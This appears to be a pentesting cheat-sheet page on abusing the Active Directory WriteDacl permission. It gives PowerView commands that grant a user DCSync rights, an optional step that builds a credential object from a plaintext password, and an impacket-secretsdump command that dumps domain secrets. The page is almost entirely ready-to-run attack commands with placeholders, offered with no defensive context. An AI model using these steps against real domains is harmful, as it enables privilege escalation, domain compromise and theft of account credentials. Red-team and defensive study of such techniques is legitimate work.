---
title: "WriteDacl"
date: 2024-7-12
tags: ["Writedacl", "Dcsync", "Powerview", "Credential Dumping", "Active Driectory", "Windows"]
---

### Abuse #1: Add dcsync right to user

{{< tab set1 tab1 active >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Import PowerView

```console
. .\PowerView.ps1
```

#### 2. Create a cred object (runas) \[optional\]

```console
$username = '<DOMAIN>\<USER>'
```

```console
$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
```

```console
$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password
```

#### 3. Add dcsync right

```console
Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred
```

{{< /tabcontent >}}

### 4. Secrets dump

{{< tab set2 tab1 active >}}Linux{{< /tab >}}
{{< tabcontent set2 tab1 >}}

```console
impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>'
```

{{< /tabcontent >}}
